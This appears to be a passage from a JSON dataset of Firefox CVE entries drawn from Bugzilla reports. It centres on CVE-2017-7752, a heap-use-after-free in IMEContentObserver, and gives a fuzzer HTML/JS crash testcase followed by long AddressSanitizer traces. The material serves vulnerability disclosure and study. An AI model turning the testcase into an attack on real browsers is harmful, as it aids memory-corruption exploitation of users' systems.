/home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #37 0x7f53912d718b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2891:12 #38 0x7f538abaf665 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:758:45 in operator bool Shadow bytes around the buggy address: 0x0c2480006f60: 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa 0x0c2480006f70: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c2480006f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2480006f90: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa 0x0c2480006fa0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd =>0x0c2480006fb0: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd 0x0c2480006fc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c2480006fd0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c2480006fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2480006ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa 0x0c2480007000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12670==ABORTING"
      }
    ],
    "CVE-2017-7752": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1359547",
        "title": "heap-use-after-free in mozilla::IMEContentObserver::HandleQueryContentEvent",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.1.0 (20170417135202). It requires the fuzzPriv extension. <script> function start() { o2=document; o38=document.createElement('input'); o56=document.createElement('form'); o38.innerHTML='<keygen name=style>'; o392=document.createElement('iframe'); o2.designMode='on'; o56.appendChild(o38); o392.style.position='fixed'; o443=document.createElement('frameset'); o444=document.createElement('audio'); o445=document.createElement('track'); o444.appendChild(o445); o2.write('<div>'); o444.controls^=1; o2.documentElement.appendChild(o444); o443.onerror=fun1; document.documentElement.appendChild(o392); document.documentElement.style.transform='scale(1)'; fuzzPriv.trustedKeyEvent(document.documentElement,'press',false,false,true,false,37,0); } var c = 0; function fun1() { if(c++>1)return; a=new FormData(o56); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); setTimeout(\"location.reload();\",400); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==25393==ERROR: AddressSanitizer: heap-use-after-free on address 0x612000032330 at pc 0x7f2fe84e5e22 bp 0x7fff07127cf0 sp 0x7fff07127ce8 READ of size 8 at 0x612000032330 thread T0 #0 0x7f2fe84e5e21 in operator bool /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:763:45 #1 0x7f2fe84e5e21 in IsInitializedWithPlugin /home/worker/workspace/build/src/dom/events/IMEContentObserver.h:136 #2 0x7f2fe84e5e21 in mozilla::IMEContentObserver::HandleQueryContentEvent(mozilla::WidgetQueryContentEvent*) /home/worker/workspace/build/src/dom/events/IMEContentObserver.cpp:777 #3 0x7f2fe842e160 in mozilla::EventStateManager::HandleQueryContentEvent(mozilla::WidgetQueryContentEvent*) /home/worker/workspace/build/src/dom/events/EventStateManager.cpp:900:5 #4 0x7f2fe842bade in mozilla::EventStateManager::PreHandleEvent(nsPresContext*, mozilla::WidgetEvent*, nsIFrame*, nsIContent*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventStateManager.cpp:610:5 #5 0x7f2fea6caae9 in PresShell::HandleEventInternal(mozilla::WidgetEvent*, nsEventStatus*, bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:8254:10 #6 0x7f2fea6c6964 in PresShell::HandleEvent(nsIFrame*, mozilla::WidgetGUIEvent*, bool, nsEventStatus*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:7980:12 #7 0x7f2fea6c36e1 in PresShell::HandleEvent(nsIFrame*, mozilla::WidgetGUIEvent*, bool, nsEventStatus*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:7468:16 #8 0x7f2fe9c8c66f in nsViewManager::DispatchEvent(mozilla::WidgetGUIEvent*, nsView*, nsEventStatus*) /home/worker/workspace/build/src/view/nsViewManager.cpp:815:7 #9 0x7f2fe9c849c0 in nsView::HandleEvent(mozilla::WidgetGUIEvent*, bool) /home/worker/workspace/build/src/view/nsView.cpp:1117:5 #10 0x7f2fe9d40088 in nsWindow::DispatchEvent(mozilla::WidgetGUIEvent*, nsEventStatus&) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:582:17 #11 0x7f2fe9d6b078 in nsWindow::ExecuteNativeKeyBinding(nsIWidget::NativeKeyBindingsType, mozilla::WidgetKeyboardEvent const&, void (*)(mozilla::Command, void*), void*) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:6487:9 #12 0x7f2fe9e79093 in mozilla::EditorEventListener::KeyPress(nsIDOMKeyEvent*) /home/worker/workspace/build/src/editor/libeditor/EditorEventListener.cpp:636:18 #13 0x7f2fe9e76b2f in mozilla::EditorEventListener::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/editor/libeditor/EditorEventListener.cpp:407:14 #14 0x7f2fe84cf99d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #15 0x7f2fe84d13c7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #16 0x7f2fe84bc7b9 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:401:9 #17 0x7f2fe84bcb6b in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:429:5 #18 0x7f2fe84bfb88 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #19 0x7f2fe84c1a87 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:780:12 #20 0x7f2fe676cf01 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1309:5 #21 0x7f2fe84dc2c0 in mozilla::dom::EventTarget::DispatchEvent(JSContext*, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/events/EventTarget.cpp:73:9 #22 0x7f2fe7bee79b in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:988:15 #23 0x7f2fe7beb75c in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:1164:13 #24 0x7f2fee331f55 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #25 0x7f2fee331f55 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #26 0x7f2fee31235f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #27 0x7f2fee31235f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #28 0x7f2fee2f751d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #29 0x7f2fee3325bf in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #30 0x7f2fee332c02 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #31 0x7f2fede02e42 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #32 0x7f2fe51f9c1f in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #33 0x7f2fee331f55 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #34 0x7f2fee331f55 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #35 0x7f2fee31235f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #36 0x7f2fee31235f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #37 0x7f2fee2f751d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #38 0x7f2fee3325bf in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #39 0x7f2fee332c02 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #40 0x7f2fede050ad in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #41 0x7f2fe7b0d7ff in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #42 0x7f2fe850398a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #43 0x7f2fe850398a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #44 0x7f2fe84cf99d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #45 0x7f2fe84d13c7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #46 0x7f2fe84bc4f6 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #47 0x7f2fe84bfb88 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #48 0x7f2fea5f5a8c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1023:7 #49 0x7f2feb38399b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7630:5 #50 0x7f2feb37f7a4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7434:7 #51 0x7f2feb386e0f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7331:13 #52 0x7f2fe56eb510 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #53 0x7f2fe56ea4a8 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #54 0x7f2fe56e7208 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #55 0x7f2fe56e9304 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #56 0x7f2fe56e9ebc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #57 0x7f2fe3c9a2ca in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #58 0x7f2fe66a5a86 in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8640:7 #59 0x7f2fe66a5456 in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8568:9 #60 0x7f2fe667b904 in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5055:3 #61 0x7f2fe6739f72 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #62 0x7f2fe6739f72 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #63 0x7f2fe6739f72 in mozilla::detail::RunnableMethodImpl<void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #64 0x7f2fe3ac63bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #65 0x7f2fe3b4578c in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #66 0x7f2fe48c112f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #67 0x7f2fe48337a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #68 0x7f2fe48337a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #69 0x7f2fe48337a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #70 0x7f2fe9d0553f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #71 0x7f2febcf8f21 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #72 0x7f2febe815ce in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #73 0x7f2febe82add in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #74 0x7f2febe8399c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #75 0x4df8ca in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #76 0x4df8ca in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #77 0x7f2ffead982f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #78 0x41ba38 in _start (/home/nils/fuzzer3/esr/firefox/firefox+0x41ba38) 0x612000032330 is located 112 bytes inside of 264-byte region [0x6120000322c0,0x6120000323c8) freed by thread T0 here: #0 0x4b218b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f2fe399b564 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7f2fe399acf5 in ~RemoveSkippableVisitor /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2776:3 #3 0x7f2fe399acf5 in nsPurpleBuffer::RemoveSkippable(nsCycleCollector*, bool, bool, void (*)()) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2817 #4 0x7f2fe399b8d3 in nsCycleCollector::ForgetSkippable(bool, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2864:3 #5 0x7f2fe39a4849 in nsCycleCollector_forgetSkippable(bool, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4097:3 #6 0x7f2fe678eea8 in FireForgetSkippable(unsigned int, bool) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1240:3 #7 0x7f2fe679180d in CCTimerFired(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1813:7 #8 0x7f2fe6794749 in nsJSContext::NotifyDidPaint() /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:2605:5 #9 0x7f2fea3b6ae4 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2050:5 #10 0x7f2fea3c0e11 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #11 0x7f2fea3c08b8 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:317:5 #12 0x7f2fea3c33ce in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByValue<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #13 0x7f2fea3c33ce in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #14 0x7f2fea3c33ce in mozilla::detail::RunnableMethodImpl<void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #15 0x7f2fe3ac63bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #16 0x7f2fe3b4578c in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #17 0x7f2feb4d0c6d in nsXULWindow::ShowModal() /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:408:12 #18 0x7f2feb3f3008 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:1323:7 #19 0x7f2feb3ee8ee in nsWindowWatcher::OpenWindow(mozIDOMWindowProxy*, char const*, char const*, char const*, nsISupports*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:353:10 #20 0x7f2feb8fdb6e in nsNSSDialogHelper::openDialog(mozIDOMWindowProxy*, char const*, nsISupports*, bool) /home/worker/workspace/build/src/security/manager/pki/nsNSSDialogHelper.cpp:47:8 #21 0x7f2feb9019e3 in DisplayGeneratingKeypairInfo /home/worker/workspace/build/src/security/manager/pki/nsNSSDialogs.cpp:365:8 #22 0x7f2feb9019e3 in non-virtual thunk to nsNSSDialogs::DisplayGeneratingKeypairInfo(nsIInterfaceRequestor*, nsIKeygenThread*) /home/worker/workspace/build/src/security/manager/pki/nsNSSDialogs.cpp:358 #23 0x7f2feb85f5f5 in nsKeygenFormProcessor::GetPublicKey(nsAString_internal const&, nsAString_internal const&, nsString const&, nsAString_internal&, nsAString_internal const&) /home/worker/workspace/build/src/security/manager/ssl/nsKeygenHandler.cpp:606:18 #24 0x7f2feb860acb in nsKeygenFormProcessor::ProcessValue(nsIDOMHTMLElement*, nsAString_internal const&, nsAString_internal&) /home/worker/workspace/build/src/security/manager/ssl/nsKeygenHandler.cpp:755:12 #25 0x7f2fe87e91f2 in mozilla::dom::HTMLSelectElement::SubmitNamesValues(mozilla::dom::HTMLFormSubmission*) /home/worker/workspace/build/src/dom/html/HTMLSelectElement.cpp:1704:11 #26 0x7f2fe87e96cc in non-virtual thunk to mozilla::dom::HTMLSelectElement::SubmitNamesValues(mozilla::dom::HTMLFormSubmission*) /home/worker/workspace/build/src/dom/html/HTMLSelectElement.cpp:1659:20 #27 0x7f2fe86c191c in mozilla::dom::HTMLFormElement::WalkFormElements(mozilla::dom::HTMLFormSubmission*) /home/worker/workspace/build/src/dom/html/HTMLFormElement.cpp:1059:5 #28 0x7f2fe64c09a1 in mozilla::dom::FormData::Constructor(mozilla::dom::GlobalObject const&, mozilla::dom::Optional<mozilla::dom::NonNull<mozilla::dom::HTMLFormElement> > const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/FormData.cpp:393:11 #29 0x7f2fe7cb488b in mozilla::dom::FormDataBinding::_constructor(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FormDataBinding.cpp:1033:54 #30 0x7f2fee332efc in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #31 0x7f2fee332efc in CallJSNativeConstructor /home/worker/workspace/build/src/js/src/jscntxtinlines.h:272 #32 0x7f2fee332efc in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562 #33 0x7f2fee3122c8 in ConstructFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:588:12 #34 0x7f2fee3122c8 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2914 #35 0x7f2fee2f751d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #36 0x7f2fee3325bf in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 previously allocated by thread T0 here: #0 0x4b24ab in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0d9d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f2fe84f9a98 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f2fe84f9a98 in mozilla::IMEStateManager::CreateIMEContentObserver(nsIEditor*) /home/worker/workspace/build/src/dom/events/IMEStateManager.cpp:1599 #4 0x7f2fe84fc822 in mozilla::IMEStateManager::UpdateIMEState(mozilla::widget::IMEState const&, nsIContent*, nsIEditor*) /home/worker/workspace/build/src/dom/events/IMEStateManager.cpp:836:5 #5 0x7f2fe9e3bcd9 in mozilla::EditorBase::PostCreate() /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:331:5 #6 0x7f2fea0258ba in nsEditingSession::SetupEditorOnWindow(mozIDOMWindowProxy*) /home/worker/workspace/build/src/editor/composer/nsEditingSession.cpp:481:10 #7 0x7f2fea022176 in nsEditingSession::MakeWindowEditable(mozIDOMWindowProxy*, char const*, bool, bool, bool) /home/worker/workspace/build/src/editor/composer/nsEditingSession.cpp:173:10 #8 0x7f2fe88a05b3 in nsHTMLDocument::EditingStateChanged() /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2763:12 #9 0x7f2fe88b452c in SetDesignMode /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2867:10 #10 0x7f2fe88b452c in nsHTMLDocument::SetDesignMode(nsAString_internal const&, nsIPrincipal&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2850 #11 0x7f2fe7d7eb5a in mozilla::dom::HTMLDocumentBinding::set_designMode(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitSetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:757:3 #12 0x7f2fe81072e3 in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2847:8 #13 0x7f2fee331f55 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f2fee331f55 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #15 0x7f2fee333c98 in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #16 0x7f2fee333c98 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:650 #17 0x7f2fee3990cf in SetExistingProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2434:10 #18 0x7f2fee3990cf in js::NativeSetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::QualifiedBool, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2469 #19 0x7f2fee04b628 in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1540:12 #20 0x7f2fee04b628 in js::SetPropertyIgnoringNamedGetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::PropertyDescriptor>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/BaseProxyHandler.cpp:182 #21 0x7f2fe8111345 in mozilla::dom::DOMProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/dom/bindings/DOMJSProxyHandler.cpp:258:10 #22 0x7f2fee07cb01 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:333:12 #23 0x7f2fedf5c79a in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/jsobj.cpp:1022:12 #24 0x7f2fee30b03f in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1539:16 #25 0x7f2fee30b03f in SetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:259 #26 0x7f2fee30b03f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2715 #27 0x7f2fee2f751d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 